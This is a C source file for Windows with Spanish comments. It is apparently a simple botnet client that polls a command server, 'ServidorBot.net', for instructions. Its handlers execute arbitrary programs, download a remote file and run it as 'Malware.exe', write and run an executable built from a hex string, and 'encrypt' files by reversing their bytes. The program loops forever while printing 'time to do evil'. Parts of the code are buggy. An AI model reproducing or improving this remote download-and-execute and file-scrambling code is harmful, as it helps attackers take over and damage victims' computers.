// Herramientas -> Opciones de Compilación -> Añadir estos comandos a la línea de comandos del linker
// -lwininet
#include<windows.h>
#include<stdio.h>
#include<wininet.h>
#include<time.h> 
 
 
//Funcion auxliar reverse
//Funcion que lee un archivo especificado en ipbuffer
//Y lo escribe cambiando el orden de sus bits
//@Param, ipbuffer,una cadena que indica la ruta del archivo
//numberofBytesRead un entero que nos indica cuantos bytes se leyeron 
void reverse(char lpBuffer[1024],int numberOfBytesRead){
    //Variables
    char ruta[1024];
    unsigned char bufferArchivo[1024];
    char ArchivoEncriptado[1024];
    FILE *ptr;
    int j = 0;
    FILE *write_ptr;
    //Obtenemos la ruta
    strncpy(ruta,lpBuffer + 21, numberOfBytesRead);
    ruta[numberOfBytesRead-21] = '\0';
    //Leemos el archivo
    ptr = fopen(ruta,"rb");
    fread(bufferArchivo,sizeof(bufferArchivo),1,ptr);
    //Encriptamos el archivo
    for(j = 0; j <= sizeof(bufferArchivo);j++){
        ArchivoEncriptado[j] = bufferArchivo[sizeof(bufferArchivo)-j];
    }
    //Escribimos el archivo
    char termination[6] = ".crypt";
    strncat(ruta,termination,sizeof(termination));
    write_ptr = fopen(ruta,"wb");
    fwrite(ArchivoEncriptado,sizeof(ArchivoEncriptado),1,write_ptr);
    Sleep(60000);
    printf("Es hora de hacer el mal");
    main();
    }

//Funcion auxliar urdownload
//Funcion que descarga un archivo especificado en la ruta 
//guardada en ipbuffer,para despues ejecutar el archivo
//@Param, ipbuffer,una cadena que indica la ruta del archivo,como version pagina web
//numberofBytesRead un entero que nos indica cuantos bytes se leyeron
void urldonwload(char lpBuffer[1024],int numberOfBytesRead){
    //Variables
    char ruta[1024];
    char rutaAux[1024];
    char token[1024];
    int j = 0;
    HRESULT returnValue;
    // Function prototype, URLMON.URLDownloadToFileA
    typedef HRESULT(WINAPI *tURLDownloadToFileA)(LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, DWORD dwReserved, void *lpfnCB);
    tURLDownloadToFileA pURLDownloadToFileA;
	// Get address of the function from the specified dynamic-link library
    pURLDownloadToFileA = (tURLDownloadToFileA)GetProcAddress(LoadLibraryA("urlmon.dll"), "URLDownloadToFileA");
	// CALL URLDownloadToFileA
	//Obtenemos la ruta del exe
        strncpy(ruta,lpBuffer + 11, numberOfBytesRead - 10);
        ruta[numberOfBytesRead-11] = '\0';
        
    returnValue = pURLDownloadToFileA(0, ruta+1, "Malware.exe", 0, 0);
    // Return code
    if(returnValue == S_OK){
        //Ejecutamos el programa
        ShellExecuteA(GetDesktopWindow(),"open","Malware.exe",NULL,NULL,SW_SHOW);
    }
    else if(returnValue == E_OUTOFMEMORY){
        printf("The buffer length is invalid, or there is insufficient memory to complete the operation");
    }
    else{
        printf("File download failed");
        }
    Sleep(60000);
    printf("Es hora de hacer el mal");
    main();
    }

//Funcion auxliar fileHex
//Funcion que lee una cadena hexadecimal
//reconstruye un archivo de ella y lo ejecuta 
//la cadena hexadecimal esta guardada en ipbuffer
//@Param, ipbuffer,una cadena que indica la cadena en hexadecimal
//numberofBytesRead un entero que nos indica cuantos bytes se leyeron
void fileHex(char lpBuffer[1024],int numberOfBytesRead){
    //variables
    char ruta[1024];
    char archivo[1024];
    FILE *write_ptr;
    //Obtenemos la cadena del hexadecimal
    strncpy(ruta,lpBuffer + 5, numberOfBytesRead - 4);
    ruta[numberOfBytesRead-5] = '\0';
    sscanf(ruta,"%sx",archivo);
    //escribimos el archivo
    write_ptr = fopen("malware.exe","wb");
    fwrite(archivo,sizeof(archivo),1,write_ptr);
    ShellExecuteA(GetDesktopWindow(),"open","malware.exe",NULL,NULL,SW_SHOW);
    Sleep(60000);
    printf("Es hora de hacer el mal");
    main();
    }
    
    
//Funcion auxliar executer
//Funcion que ejecuta un archivo exe especificado en la ruta
//guardada en ipbuffer
//Y lo escribe cambiando el orden de sus bits
//@Param, ipbuffer,una cadena que indica la ruta del archivo
//numberofBytesRead un entero que nos indica cuantos bytes se leyeron
void executer(char lpBuffer[1024],int numberOfBytesRead){
    //Variables
    char ruta[1024];
    //Obtenemos la ruta del exe
    strncpy(ruta,lpBuffer + 5, numberOfBytesRead - 4);
    ruta[numberOfBytesRead-5] = '\0';
    //Ejecutamos
    ShellExecuteA(GetDesktopWindow(),"open",ruta,NULL,NULL,SW_SHOW);
    Sleep(60000);
    printf("Es hora de hacer el mal");
    main();
    }
 
 
 
int main(){
	// Parameters in the function prototype
    HINTERNET hInternetOpenSession, hFile;
	char lpBuffer[1024];
    DWORD numberOfBytesRead;
    int flag = 0;
    char pattern[6];
	// InternetOpen
    hInternetOpenSession = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0); // Type of access required
    if(hInternetOpenSession == NULL){
        printf("InternetOpen failed\n");
    }
	// InternetOpenUrl
    hFile = InternetOpenUrl(hInternetOpenSession, "http://www.ServidorBot.net/Bitacora.log", 0, 0, INTERNET_NO_CALLBACK | INTERNET_FLAG_DONT_CACHE, 0);
    if(hFile == NULL){
        printf("InternetOpenUrl failed\n");
    }
	// InternetReadFile
    while(!flag){
        if(InternetReadFile(hFile, lpBuffer, sizeof(lpBuffer), &numberOfBytesRead)){
            if(numberOfBytesRead > 0){
                //Leemos los primeros 4 caracteres de la cadena
                strncpy(pattern,lpBuffer, 4);
                pattern[4] = '\0';
                if(strcmp(pattern,"exec") == 0){
                    executer(lpBuffer,numberOfBytesRead);
                    }
                else if(strcmp(pattern,"exit") == 0){
                    printf("adios bot");
                    exit(EXIT_SUCCESS);
                    }
                else if(strcmp(pattern,"urld") == 0){
                    urldonwload(lpBuffer,numberOfBytesRead);
                    }
                else if(strcmp(pattern,"file") == 0){
                    fileHex(lpBuffer,numberOfBytesRead);
                }
                else if(strcmp(pattern,"reve") == 0){
                    reverse(lpBuffer,numberOfBytesRead);
                }
            }
            else{
                flag = 1;
            }
        }
        else{
            printf("InternetReadFile failed\n");
            flag = 1;
        }
    }
    InternetCloseHandle(hInternetOpenSession);
    InternetCloseHandle(hFile);
    Sleep(60000);
    printf("Es hora de hacer el mal");
    main();
    
}



// DOWNLOADING A WEB PAGE IN C USING WININET
// http://www.martinbroadhurst.com/downloading-a-web-page-in-c-using-wininet.html

// Downloading data via WinInet
// https://stackoverflow.com/questions/47486240/downloading-data-via-wininet
